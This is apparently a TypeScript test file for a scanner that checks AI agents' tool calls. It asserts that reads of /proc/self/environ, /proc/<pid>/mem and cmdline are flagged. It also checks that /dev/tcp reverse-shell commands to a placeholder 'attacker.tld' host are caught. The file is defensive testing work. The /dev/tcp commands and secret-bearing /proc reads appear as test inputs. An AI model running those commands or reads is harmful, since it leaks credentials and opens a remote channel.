/**
 * Filesystem-boundary detectors for /proc, /sys, /dev. An agent reading
 * `/proc/self/environ` exfiltrates every env var (including AWS / GH
 * tokens). `/proc/<pid>/mem` is a direct memory read. The Bash-side
 * `/dev/tcp/host/port` reverse-shell rule already exists; pin the
 * read-direction case here so a regression flips the test.
 */

import { describe, it, expect } from 'vitest';
import { scanToolUseBlocks } from './detectors.js';

const ALL_OPTS = { scanSecrets: true, scanInjection: true, scanToolUse: true };

describe('scanToolUseBlocks — /proc filesystem detectors', () => {
  it('flags HIGH for Read(/proc/self/environ)', () => {
    const findings = scanToolUseBlocks(
      [{ index: 0, name: 'Read', input: { file_path: '/proc/self/environ' } }],
      ALL_OPTS,
    );
    const f = findings.find((x) => x.detectorId === 'proc-self-environ');
    expect(f).toBeDefined();
    expect(f!.severity).toBe('high');
    expect(f!.kind).toBe('risky_read');
  });

  it('flags HIGH for Read(/proc/12345/environ) — any pid', () => {
    const findings = scanToolUseBlocks(
      [{ index: 0, name: 'Read', input: { file_path: '/proc/12345/environ' } }],
      ALL_OPTS,
    );
    const f = findings.find((x) => x.detectorId === 'proc-self-environ');
    expect(f).toBeDefined();
    expect(f!.severity).toBe('high');
  });

  it('flags HIGH for Read(/proc/self/mem) — direct memory read', () => {
    const findings = scanToolUseBlocks(
      [{ index: 0, name: 'Read', input: { file_path: '/proc/self/mem' } }],
      ALL_OPTS,
    );
    const f = findings.find((x) => x.detectorId === 'proc-self-mem');
    expect(f).toBeDefined();
    expect(f!.severity).toBe('high');
  });

  it('flags MEDIUM for Read(/proc/12345/cmdline)', () => {
    const findings = scanToolUseBlocks(
      [{ index: 0, name: 'Read', input: { file_path: '/proc/12345/cmdline' } }],
      ALL_OPTS,
    );
    const f = findings.find((x) => x.detectorId === 'proc-self-cmdline');
    expect(f).toBeDefined();
    expect(f!.severity).toBe('medium');
  });

  it('does NOT flag /proc/self/status (not in list)', () => {
    const findings = scanToolUseBlocks(
      [{ index: 0, name: 'Read', input: { file_path: '/proc/self/status' } }],
      ALL_OPTS,
    );
    expect(findings.filter((x) => x.kind === 'risky_read')).toEqual([]);
  });

  it('does NOT match `/procx/self/environ` — anchor enforced', () => {
    // The regex must anchor at `/proc/`. A path under `/procx/...` is
    // not the kernel-exposed pseudo-fs and should not fire.
    const findings = scanToolUseBlocks(
      [{ index: 0, name: 'Read', input: { file_path: '/procx/self/environ' } }],
      ALL_OPTS,
    );
    expect(findings.filter((x) => x.kind === 'risky_read')).toEqual([]);
  });

  it('does NOT match relative `proc/self/environ` (no leading `/`)', () => {
    const findings = scanToolUseBlocks(
      [{ index: 0, name: 'Read', input: { file_path: 'proc/self/environ' } }],
      ALL_OPTS,
    );
    expect(findings.filter((x) => x.kind === 'risky_read')).toEqual([]);
  });

  it('Read with no file_path is a no-op (defensive)', () => {
    const findings = scanToolUseBlocks([{ index: 0, name: 'Read', input: {} }], ALL_OPTS);
    expect(findings).toEqual([]);
  });

  it('returns nothing when scanToolUse is disabled', () => {
    const findings = scanToolUseBlocks(
      [{ index: 0, name: 'Read', input: { file_path: '/proc/self/environ' } }],
      { ...ALL_OPTS, scanToolUse: false },
    );
    expect(findings).toEqual([]);
  });
});

describe('scanToolUseBlocks — /dev/tcp Bash rule covers read direction', () => {
  it('flags `cat < /dev/tcp/host/port` (read-direction reverse shell)', () => {
    // Pin the contract: the existing reverse-shell-devtcp BASH_RULE is
    // a substring scan of the Bash command, so it catches input
    // redirection (`< /dev/tcp/...`) as well as output redirection.
    // Severity may be downgraded by context-confidence modifiers, so
    // we assert the detectorId fires (the contract being pinned)
    // rather than the final severity.
    const findings = scanToolUseBlocks(
      [{ index: 0, name: 'Bash', input: { command: 'cat < /dev/tcp/attacker.tld/4444' } }],
      ALL_OPTS,
    );
    const f = findings.find((x) => x.detectorId === 'reverse-shell-devtcp');
    expect(f).toBeDefined();
    expect(f!.kind).toBe('risky_bash');
  });

  it('flags `exec 3<>/dev/tcp/host/port` (bidirectional fd setup)', () => {
    const findings = scanToolUseBlocks(
      [{ index: 0, name: 'Bash', input: { command: 'exec 3<>/dev/tcp/attacker.tld/4444' } }],
      ALL_OPTS,
    );
    expect(findings.find((x) => x.detectorId === 'reverse-shell-devtcp')).toBeDefined();
  });
});
